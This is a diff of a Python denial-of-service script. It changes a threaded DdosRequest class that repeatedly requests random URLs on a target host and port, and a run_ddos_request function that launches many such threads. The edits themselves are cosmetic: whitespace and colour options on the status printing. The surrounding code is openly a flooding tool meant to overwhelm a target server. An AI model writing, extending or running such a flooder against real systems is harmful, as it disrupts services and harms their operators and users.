@@ -7,7 +7,6 @@ from print_color import print
 
 
 class DdosRequest(threading.Thread):
-
     target = ''
 
     def __init__(self, target: str, port: int = None):
@@ -28,8 +27,6 @@ class DdosRequest(threading.Thread):
             my_str.append(text)
         return '&'.join(my_str)
 
-
-
     def run(self):
         port = f':{self.port}' if self.port else ''
         url = f'{self.target}{port}/{self.rand_str()}'
@@ -41,11 +38,11 @@ class DdosRequest(threading.Thread):
                 headers=header_service.header(self.target)
             )
             if res.status_code < 300:
-                print(url, tag_color='g', tag=f"{res.status_code}")
+                print(url, color='c', tag_color='g', tag=f"{res.status_code}")
             if 300 < res.status_code < 400:
-                print(url, tag_color='y', tag=f"{res.status_code}")
+                print(url, color='w', tag_color='y', tag=f"{res.status_code}")
             else:
-                print(url, tag_color='r', tag=f"{res.status_code}")
+                print(url, color='w', tag_color='r', tag=f"{res.status_code}")
 
         except Exception as e:
             print(e)
@@ -62,6 +59,3 @@ def run_ddos_request(host: str, port: int, user_thread: int):
                 t.join()
         except KeyboardInterrupt:
             exit(101)
-
-
-
